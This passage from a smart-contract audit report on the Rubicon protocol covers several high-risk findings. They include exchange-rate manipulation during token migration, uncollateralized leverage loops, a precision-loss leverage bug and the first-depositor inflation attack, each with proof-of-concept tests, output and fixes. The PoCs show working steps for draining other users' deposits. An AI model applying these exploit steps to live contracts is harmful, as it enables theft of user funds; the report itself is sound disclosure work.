    underlying.approve(bathTokenV2, amountWithdrawn);
    require(
        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,
        "migrate: MINT FAILED"
    );
    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function
    IERC20(bathTokenV2).transfer(
        msg.sender,
        IERC20(bathTokenV2).balanceOf(address(this))
    );
    ...
}
```

This process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.

The amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:

```solidity
function mintFresh(address minter, uint mintAmount) internal {
    // ... minting checks  ...

    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});

    uint mintTokens = div_(actualMintAmount, exchangeRate);

    /*
    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:
    *  totalSupplyNew = totalSupply + mintTokens
    *  accountTokensNew = accountTokens[minter] + mintTokens
    * And write them into storage
    */
    totalSupply = totalSupply + mintTokens;
    accountTokens[minter] = accountTokens[minter] + mintTokens;

    /* We emit a Mint event, and a Transfer event */
    emit Mint(minter, actualMintAmount, mintTokens);
    emit Transfer(address(this), minter, mintTokens);

    /* We call the defense hook */
    // unused function
    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);

}
```

An attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:

```solidity
function exchangeRateStoredInternal() virtual internal view returns (uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        /*
            * If there are no tokens minted:
            *  exchangeRate = initialExchangeRate
            */
        return initialExchangeRateMantissa;
    } else {
        /*
            * Otherwise:
            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
            */
        uint totalCash = getCashPrior();
        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;

        return exchangeRate;
    }
}
```

Essentially, more tokens will be minted if the rate is decreased, as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.

### Proof of Concept

This scenario can be abused by attackers willing to harm other users that are migrating from one type of token to another, knowing that the liquidity of the pool is low.

The following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.

```ts
  it("can manipulate the migration yield", async function () {
    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(
      deployBathTokensFixture
    );
    // *** POOLS UTILITY
    const PriceOracleFactory = await ethers.getContractFactory(
      "DummyPriceOracle"
    );
    const priceOracle = await PriceOracleFactory.deploy();
    await priceOracle.addCtoken(testCoin.address, parseUnits("1", 30));
    await priceOracle.addCtoken(bathTokenV2.address, parseUnits("1", 30));

    await comptroller._setPriceOracle(priceOracle.address);
    await comptroller._supportMarket(bathTokenV2.address)

    await comptroller._setCollateralFactor(
      bathTokenV2.address,
      parseUnits("0.9", 18)
    ); // 90% of collateral is borrowable
    await comptroller._setBorrowPaused(bathTokenV2.address, false)

    const simulatedFlashloanAmount = 10_000_000
    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins
    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)
    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)
    
    // A big borrow lands before the migration
    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);
    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);
    console.log(`\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)
    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));
    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)

    // ======= Comment/Uncomment this for the manipulated scenario ===========
    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);
    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))
    // =======================================================================

    // bath balance before migration
    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);
    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);
    console.log(`\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)
    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)

    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);
    await migrator.migrate(bathTokenV1.address);

    // bath balance after migration
    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);
    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);

    console.log(`\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)
    console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)

    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);
    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);
    await bathTokenV2.redeem(bathTokenV2BalanceAfter);
    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);
    console.log(`\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)
    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)
  });
```

```
- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT
Initial - TestCoin Balance [Attacker]: 10000000000000000000000000

Before Borrow - TestCoin Balance [Attacker]: 0
After Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000

Before Migration - BathTokenV1 Balance [Victim]: 14999999999999999000
Before Migration - BathTokenV2 Balance [Victim]: 0

After Migration - BathTokenV1 Balance [Victim]: 0
After Migration - BathTokenV2 Balance [Victim]: 74977479826

After Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181
After Redemption - BathTokenV2 Balance [Victim]: 0
```

```
- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT
Initial - TestCoin Balance [Attacker]: 10000000000000000000000000

Before Borrow - TestCoin Balance [Attacker]: 0
After Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000

Before Migration - BathTokenV1 Balance [Victim]: 14999999999999999000
Before Migration - BathTokenV2 Balance [Victim]: 0

After Migration - BathTokenV1 Balance [Victim]: 0
After Migration - BathTokenV2 Balance [Victim]: 74977479826

After Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007
After Redemption - BathTokenV2 Balance [Victim]: 0
```

It is simulating the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`), the loss of migrating will mean `40347` of tokens, even if the price is 1 USD per token, the loss is considerable.

### Mitigation

Simulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount).

**[daoio (Rubicon) acknowledged](https://github.com/code-423n4/2023-04-rubicon-findings/issues/497#issuecomment-1534851464)**

***

## [[H-15] The last borrowed asset will not be collateralized and the user may be liquidated due to insufficient collateral](https://github.com/code-423n4/2023-04-rubicon-findings/issues/423)
*Submitted by [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/423), also found by [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/690)*.

All leveraged positions are opened by simple recursive borrowing loop (supply collateral → borrow → swap → repeat).
The issue here is that the last borrowed asset will not be collateralized.

```solidity
    function _borrowLoop(
        address _asset,
        address _quote,
        address _bathTokenAsset,
        address _bathTokenQuote,
        uint256 _amount,
        uint256 _toBorrow
    ) internal returns (uint256 _bathTokenAmount) {
        // supply collateral
        _bathTokenAmount = _supply(_asset, _bathTokenAsset, _amount);

        // calculate how much is needed to borrow from _maxBorrow amount
        //_toBorrow = (_maxBorrow(_bathTokenQuote).mul(_toBorrow)).div(WAD);
        _toBorrow = wmul(_maxBorrow(_bathTokenQuote), _toBorrow);

        // swap borrowed quote tokens to asset tokens
        _borrow(_bathTokenQuote, _toBorrow);
        _rubiconSwap(_asset, _quote, _toBorrow, true);
    }
...
            // increase bathToken amount in order to save it in positions map
            vars.currentBathTokenAmount += _borrowLoop(
                asset,
                quote,
                bathTokenAsset,
                bathTokenQuote,
                vars.currentAssetBalance,
                vars.toBorrow
            );
        }
```

Consider the WBTC collateralization rate is 0.7.

Alice uses 1e8 WBTC and 1.7x leverage to long WBTC

In `_borrowLoop`, 1e8 WBTC is collateralized and borrowed to USDC, and 0.7e8 WBTC is purchased using USDC, and the 0.7e8 WBTC is uncollateralized. At this point, the user's collateral is 1e8 WBTC and the borrowed USDC is worth 0.7e8 WBTC. If the price of WBTC drops slightly, the user will be liquidated.

The POC below indicates the purchased WBTC is not collateralized:

```
    describe("Long positions 📈", function () {
      it("POC1", async function () {
        const { owner, testCoin, testStableCoin, Position } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const TEST_AMOUNT_1 = parseUnits("1");
        const x1_7 = parseUnits("1.7");

        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_1,
          x1_7
        );

        const position = await Position.positions(1);

        console.log("borrowedAmount1 : %s",position[2]);
        console.log("testCoin balance in position : %s",await testCoin.balanceOf(Position.address));
      });
```

```
  Leverage positions Test
    Pools Utility Test
      Long positions 📈
borrowedAmount1 : 630000
testCoin balance in position : 692923770693000000
```

### Proof of Concept

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269> <br><https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L183-L192>

### Tools Used

Hardhat

### Recommended Mitigation Steps

When the loop in `openPosition` ends, collateralize the remaining assets in the contract.

```diff
            vars.currentBathTokenAmount += _borrowLoop(
                asset,
                quote,
                bathTokenAsset,
                bathTokenQuote,
                vars.currentAssetBalance,
                vars.toBorrow
            );
        }
+       vars.currentBathTokenAmount += _supply(asset, bathTokenAsset, IERC20(asset).balanceOf(address(this));
        /// @dev save total borrow amount of this current position
        vars.borrowedAmount = (borrowBalance(bathTokenQuote)).sub(
            vars.borrowedAmount
        );
```

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/423#issuecomment-1547174044)**

***

## [[H-16] Due to the loss of precision, `openPosition` will make the user's leverage higher than expected](https://github.com/code-423n4/2023-04-rubicon-findings/issues/281)
*Submitted by [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/281)*.

`openPosition` creates a leveraged position for the user based on `initMargin` and leverage, and in `_borrowLimit`, it calculates the number of borrowing loops needed to reach the desired amount.

```solidity
        (vars.limit, vars.lastBorrow) = _borrowLimit(
            bathTokenAsset,
            asset,
            initMargin,
            leverage
        );
```

For example, if `initMargin` = 1e18 and leverage = 2, then `_desiredAmount` = 2e18. If the collateral factor is 0.7, the user's position after the first borrowing is 1e18 + 1e18 &ast; 0.7 = 1.7e18, and the user's position after the second borrowing is 1e18 + 1e18 &ast; 0.7 + 1e18 &ast; 0.7 &ast; 0.7 = 2.19e18.

```solidity
        uint256 _desiredAmount = wmul(_assetAmount, _leverage);

        // check if collateral was already supplied
        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));
	// how much is borrowed on a current loop
        uint256 _loopBorrowed;

        while (_assetAmount <= _desiredAmount) {
            if (_limit == 0) {
		// if collateral already provided
                if (_minted != 0) {
                    uint256 _max = _maxBorrow(_bathToken);

		    // take into account previous collateral
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(
                        _max
                    );
                } else {
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);
                }
            } else {
                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);
            }

            // here _assetAmount refers to the
            // TOTAL asset amount in the position
            _assetAmount += _loopBorrowed;
```

For the excess of 0.19e18, `_lastBorrow` is used as the percentage of the last borrow. It should be noted that when `_lastBorrow` = 0, it means that the percentage of this borrowing is 100%.

```solidity
            if (_assetAmount > _desiredAmount) {
                // in case we've borrowed more than needed
                // return excess and calculate how much is
                // needed to borrow on the last loop
                // to not overflow _desiredAmount
                uint256 _borrowDelta = _desiredAmount.sub(
                    _assetAmount.sub(_loopBorrowed)
                );
                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);

                _limit++;
                break;
            } else if (_assetAmount == _desiredAmount) {
                // 1x short or perfect matching
                _limit++;
                break;
            } else {
                // default case
                _limit++;
            }
...
            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {
                vars.toBorrow = vars.lastBorrow;
            } else {
                // otherwise borrow max amount available to borrow - 100% from _maxBorrow
                vars.toBorrow = WAD;
            }
```

Although the long leverage must be greater than 1e18, the user can make the long leverage = 1e18+1 to make the long leverage small. But in this case, the loss of precision in the calculation will cause the user to have a higher leverage than expected.

```solidity
    function _leverageCheck(uint256 _leverage, bool _long) internal pure {
        uint256 _wad = WAD;
        uint256 _leverageMax = WAD.mul(3);

        _long // long can't be with 1x leverage
            ? require(
                _leverage > _wad && _leverage <= _leverageMax,
                "_leverageCheck{Long}: INVLAID LEVERAGE"
            )
            : require(
                _leverage >= _wad && _leverage <= _leverageMax,
                "_leverageCheck{Short}: INVLAID LEVERAGE"
            );
    }
```

Consider the following scenario:

The collateral factor of WBTC is 0.7. Alice provides 4e8 WBTC and 1e18+1 long leverage to call the `buyAllAmountWithLeverage` function.
Since wmul is rounded rather than rounded up, the `_desiredAmount` calculated in `_borrowLimit` is equal to wmul(4e8,1e18+1) = 4e8.

```solidity
        uint256 _desiredAmount = wmul(_assetAmount, _leverage);

```

After that, since `_borrowDelta` == 0, `_borrowLimit` returns limit == 1 and `_lastBorrow` == 0.

```solidity
            if (_assetAmount > _desiredAmount) {
                // in case we've borrowed more than needed
                // return excess and calculate how much is
                // needed to borrow on the last loop
                // to not overflow _desiredAmount
                uint256 _borrowDelta = _desiredAmount.sub(
                    _assetAmount.sub(_loopBorrowed)
                );
                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);

                _limit++;
                break;
```

Then in `openPosition`, since `_lastBorrow` = 0, borrowing will be done so that Alice's position reaches 4e8+4e8 &ast; 0.7 = 6.8 WBTC, at which point Alice's leverage is 1.7e18, much larger than Alice's expectations, too high leverage will increase the risk of Alice is liquidated.

```solidity
            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {
                vars.toBorrow = vars.lastBorrow;
            } else {
                // otherwise borrow max amount available to borrow - 100% from _maxBorrow
                vars.toBorrow = WAD;
            }

            // increase bathToken amount in order to save it in positions map
            vars.currentBathTokenAmount += _borrowLoop(
                asset,
                quote,
                bathTokenAsset,
                bathTokenQuote,
                vars.currentAssetBalance,
                vars.toBorrow
            );
```

### Proof of Concept

The POC and output are as follows. It can be seen that the borrowed amount of 1e18+1 is greater than 1.25e18 and 1.337e18, and the actual leverage of 1e18+1 is 1.7e18.

```
    describe("Long positions 📈", function () {
      it("POC1", async function () {
        const { owner, testCoin, testStableCoin, Position } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const TEST_AMOUNT_0_4 = parseUnits("0.4");
        const x1_1 = parseUnits("1.000000000000000001");

        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_0_4,
          x1_1
        );

        const position = await Position.positions(1);

        console.log("borrowedAmount1 : %s",position[2]);
      });

      it("POC2", async function () {
        const { owner, testCoin, testStableCoin, Position } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const TEST_AMOUNT_0_4 = parseUnits("0.4");
        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_0_4,
          x1_25
        );

        const position = await Position.positions(1);

        console.log("borrowedAmount2 : %s",position[2]);

      });
      it("POC3", async function () {
        const { owner, testCoin, testStableCoin, Position } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const TEST_AMOUNT_0_4 = parseUnits("0.4");
        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_0_4,
          x1_337
        );

        const position = await Position.positions(1);

        console.log("borrowedAmount3 : %s",position[2]);
      });
```

```
borrowedAmount1 : 252000
        ✓ POC1
borrowedAmount2 : 90000
        ✓ POC2
borrowedAmount3 : 121320
        ✓ POC3
```

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L583>

### Tools Used

Hardhat

### Recommended Mitigation Steps

Consider rounding up in `_borrowLimit` when calculating `_desiredAmount`. Or consider not borrowing when `_lastBorrow` = 0 and modifying the logic of the rest of the code.

**[daoio (Rubicon) disagreed with severity and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/281#issuecomment-1535866245):**
 > It's true, but leverage values seem too unrealistic to be used in real life (that's why I disagree with severity). Though, this finding reveals irrelevance of such huge precision for `leverage` param `$`=>`$`. Need to make it less precise.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/281#issuecomment-1565304777):**
 > > but leverage values seem too unrealistic to be used in real life
> 
> No it isn't; the warden showed how using a leverage of 1.000000000000000001x ended up using a borrow amount of `252000`, whereas a leverage of 1.25x and 1.337x borrowed smaller amounts of `90000` and `121320` respectively.

***

## [[H-17] First depositor bug on unmodified Compound fork](https://github.com/code-423n4/2023-04-rubicon-findings/issues/143)

*Submitted by [thekmj](https://github.com/code-423n4/2023-04-rubicon-findings/issues/143), also found by [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1156), [Ruhum](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1061), [Qeew](https://github.com/code-423n4/2023-04-rubicon-findings/issues/984), [33audits](https://github.com/code-423n4/2023-04-rubicon-findings/issues/840) and [fs0c](https://github.com/code-423n4/2023-04-rubicon-findings/issues/735)*.

The `CToken` implementation has the well-known first depositor bug that allows an attacker to manipulate the exchange rate of a `CToken`, allowing them to steal funds from depositing users.

Furthermore, due to the way the current `BathHouse` is implemented, not allowing an admin to create multiple markets for one underlying (see below code snippet), the entire `BathHouse` will be bricked as soon as any `CToken` market is attacked.

```solidity
function createBathToken(
    address underlying,
    InterestRateModel interestRateModel,
    uint256 initialExchangeRateMantissa,
    address implementation,
    bytes memory becomeImplementationData
) external onlyAdmin {
    // underlying can be used only for one bathToken
    require(
        tokenToBathToken[underlying] == address(0),
        "createBathToken: BATHTOKEN WITH THIS ERC20 EXIST ALDREADY"
    ); 
    // ...   
}
```

### The first-deposit front-running attack

An attack can happen as follow:

0. A `CToken` contract is created. The `CToken` total supply is '0', and no deposits have been made.
1. Alice the attacker mints a single `CToken` using her own funds.
2. Alice directly does a ERC20 transfer of the underlying to the `CToken` contract itself, inflating the exchange rate of the `CToken`.
3. Bob the user deposits some amount of underlying to mint `CTokens`.
    - Bob receives much less `CTokens` than he should have, due to exchange rate being inflated.
4. Alice now has a much larger share of the pool than what she should have gotten.

Since it is intended that the `BathTokens` are created by an admin through the contract `BathHouseV2.sol` by calling `createBathToken()`, an adversary can perform the front-running attack as soon as a `BathToken` is deployed. 

It has been shown in the above section that **a new market cannot be created on the same underlying**, if such an attack were to happen.

There are several impacts that such an attack can have:
- Direct theft of users' deposits.
- Direct theft of migrated V2 funds, if the user uses a `V2Migrator` set with a manipulated market.
- Redeployment of `BathHouse` by creating unrecoverable scenarios.
- Preventing the protocol from launching new markets, as any newly launched market can be sniped to attack.

We believe this is high risk, as this will result in possible fund loss, will brick the deployed `BathHouse` contract, as well as loss of safety in supporting new assets.

### Proof of concept

Use the following test case on `ProtocolDeployment.t.sol` for a demonstration of the front-running attack.

```solidity
function test_bug_firstDepositAttack() public {
  address alice = address(0xA11CE);
  address bob = address(0xB0B);

  // deal out tokens first
  vm.startPrank(TEST.admin());
  TEST.adminMint();
  TEST.transfer(alice, 200e18);
  TEST.transfer(bob, 100e18);
  vm.stopPrank();

  // initial config
  assertEq(bathTEST.exchangeRateStored(), 2e26);
  assertEq(bathTEST.totalSupply(), 0);
  assertEq(bathTEST.balanceOf(alice), 0);

  // mint tokens
  vm.prank(alice);
  TEST.approve(address(bathTEST), type(uint256).max);
  vm.prank(alice);
  bathTEST.mint(2e8);
  assertEq(bathTEST.balanceOf(alice), 1);
  assertEq(bathTEST.totalSupply(), 1);

  // alice front-running attack
  vm.prank(alice);
  TEST.transfer(address(bathTEST), 100e18);
  assertEq(bathTEST.getCash(), 100e18 + 2e8);

  // bob now deposits
  vm.prank(bob);
  TEST.approve(address(bathTEST), type(uint256).max);
  vm.prank(bob);
  bathTEST.mint(100e18);
  assertEq(bathTEST.balanceOf(bob), 0); // attacked! bob should've gotten some bathTokens
  assertEq(bathTEST.totalSupply(), 1);

  // alice redeems and gets everything
  vm.prank(alice);
  bathTEST.redeem(1);
  assertEq(TEST.balanceOf(alice), 300e18); // alice stole 100e18 from Bob
  assertEq(bathTEST.totalSupply(), 0);
}
```

### Recommended mitigation steps

The attack can happen when the `CToken` total supply is '0' or very low. The fix is to force-mint a minimum amount of `CTokens` that cannot be burned to either governance/admin, address(0), or perform such when the first mint happens.

A fix is demonstrated below, on the function `mintFresh` in contract `CToken`. This is also how Uniswap V2 prevents the same attack.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L398-L449

```solidity
function mintFresh(address minter, uint mintAmount) internal {
    // ...
    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});

    uint actualMintAmount = doTransferIn(minter, mintAmount);

    uint mintTokens = div_(actualMintAmount, exchangeRate);

    // fix starts
    if (totalSupply == 0) {
        totalSupply = 1000;
        accountTokens[address(0)] = 1000;
        mintTokens -= 1000;
    }
    // fix ends

    totalSupply = totalSupply + mintTokens;
    accountTokens[minter] = accountTokens[minter] + mintTokens;
    // ...
}
```

**[daoio (Rubicon) acknowledged via duplicate issue #1156](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1156#issuecomment-1547285860)**

**[neko_nyaa (warden) commented via duplicate issue #1156](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1156#issuecomment-1588254944):**
>Would do like the judge and sponsor to reconsider the impacts of this finding.
>
>The `CToken` is meant to be deployed from `BathHouse` using the following admin-only function, which is in-scope.
>
>```solidity
>function createBathToken(
>    address underlying,
>    InterestRateModel interestRateModel,
>    uint256 initialExchangeRateMantissa,
>    address implementation,
>    bytes memory becomeImplementationData
>) external onlyAdmin {
>    // ...
>    require(
>        tokenToBathToken[underlying] == address(0),
>        "createBathToken: BATHTOKEN WITH THIS ERC20 EXIST ALDREADY"
>    ); 
>    // ...   
>}
>```
>
>As shown on this function, only one `BathToken` can be created per ERC20 token. Thus, the impact of this attack is not only a redeployment, but it also directly affects in-scope contracts by bricking said market, since the market actually cannot be redeployed.
>
>Therefore the bug directly affects in-scope contracts, and can be seen as erroneous integration of code forks.
>
>This is also mentioned in the [#143](https://github.com/code-423n4/2023-04-rubicon-findings/issues/143) report. I believe none of the other reports mentioned this.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/143#issuecomment-1588435508):**
 > Report was initially redacted, added in the content.
> 
> One detail that all other dups failed to mention was the bricking of re-creation of markets with the same underlying (other than from lost assets), which was what brought this bug in-scope. It is of course possible to do an entire re-deployment, but that would require re-deployments of all existing prior markets as well.

***

 
# Medium Risk Findings (28)
## [[M-01] Fee inclusivity calculations are inaccurate in `RubiconMarket`](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1312)
*Submitted by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1312), also found by [minhtrng](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1361), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1335), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1331), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1318), [minhtrng](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1261), [McToady](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1244), [McToady](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1240), [LaScaloneta](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1160), [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1148), [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1127), [kutugu](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1002), [\_\_141345\_\_](https://github.com/code-423n4/2023-04-rubicon-findings/issues/884), [ast3ros](https://github.com/code-423n4/2023-04-rubicon-findings/issues/832), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/774), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/762), [cloudjunky](https://github.com/code-423n4/2023-04-rubicon-findings/issues/720), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/669), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/652), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/610), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/606), [zaevlad](https://github.com/code-423n4/2023-04-rubicon-findings/issues/577), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/572), [John](https://github.com/code-423n4/2023-04-rubicon-findings/issues/438), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/425), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/422), [ljmanini](https://github.com/code-423n4/2023-04-rubicon-findings/issues/326), [nobody2018](https://github.com/code-423n4/2023-04-rubicon-findings/issues/295), [J4de](https://github.com/code-423n4/2023-04-rubicon-findings/issues/237), [ckksec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/157), [0xnev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/100) and [SpicyMeatball](https://github.com/code-423n4/2023-04-rubicon-findings/issues/44)*.

Trading in the `RubiconMarket` has associated fee costs that are paid by the taker of the offer. These fees include the protocol fee and a new "maker fee" introduced in v2. Fees are pulled from the taker (caller of the function) independently of the trade amount, which means fees are not included in the trade amount. These are implemented in the `buy` function of the base contract `SimpleMarket`:

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L337-L373>

```solidity
337:         /// @dev Fee logic added on taker trades
338:         uint256 fee = mul(spend, feeBPS) / 100_000;
339:         require(
340:             _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),
341:             "Insufficient funds to cover fee"
342:         );
343: 
344:         // taker pay maker 0_0
345:         if (makerFee() > 0) {
346:             uint256 mFee = mul(spend, makerFee()) / 100_000;
347: 
348:             /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient
349:             if (_offer.owner == address(0) && getRecipient(id) != address(0)) {
350:                 require(
351:                     _offer.buy_gem.transferFrom(
352:                         msg.sender,
353:                         _offer.recipient,
354:                         mFee
355:                     ),
356:                     "Insufficient funds to cover fee"
357:                 );
358:             } else {
359:                 require(
360:                     _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),
361:                     "Insufficient funds to cover fee"
362:                 );
363:             }
364: 
365:             emit emitFee(
366:                 bytes32(id),
367:                 msg.sender,
368:                 _offer.owner,
369:                 keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),
370:                 _offer.buy_gem,
371:                 mFee
372:             );
373:         }
```

One of the new additions in the `RubiconMarket v2` is fee inclusivity, a feature that would allow users to operate on the market by including the fee directly in the specified amount. This is present in different places of the contract, but the core implementation can be founded in the `calcAmountAfterFee` function:

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589>

```solidity
578:     function calcAmountAfterFee(
579:         uint256 amount
580:     ) public view returns (uint256 _amount) {
581:         require(amount > 0);
582:         _amount = amount;
583:         _amount -= mul(amount, feeBPS) / 100_000;
584: 
585:         if (makerFee() > 0) {
586:             _amount -= mul(amount, makerFee()) / 100_000;
587:         }
588:     }
```

As we can see in the previous snippet, the function calculates the protocol fee and the marker fee based on the given amount, and substacts those values from the amount. This is an inaccurate calculation, as these fees later on will be calculated using this new value, which won't end up totalling the requested original amount. As an example, let's consider the case of 100 tokens, a 10% protocol fee and a 5% maker fee:

1.  Initial amount is 1000 tokens.
2.  Protocol fee is `1000 * 10% = 100` tokens.
3.  Maker fee is `1000 * 5% = 50` tokens.
4.  Resulting amount of `calcAmountAfterFee` will be `1000 - 100 - 50 = 850` tokens.
5.  In the core `buy` function, the trade amount will be 850 tokens, and the function will then calculate fees based on this amount.
6.  Protocol fee will be calculated as `850 * 10% = 85` and maker fee will be calculated as `850 * 5% = 42` tokens.
7.  This means that the user will end up paying 850 for the trade, 85 for the protocol fee and 42 for the maker fee. `850 + 85 + 42 = 977` which is a bit less than the original 1000 tokens.

### Proof of Concept

In the following test, Alice makes an offer to sell 30k USDC for 1 BTC. Bob will execute the trade to buy the complete 30k USDC with BTC. However, as the fee calculation is inaccurate, the trade will be executed for an amount less than expected and Bob will be left with some unspent BTC (0.000225 BTC).

    Logs:
      Bob BTC balance: 225000000000000

*Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).*

```solidity
function test_RubiconMarket_buy_IncorrectFeeInclusivity() public {
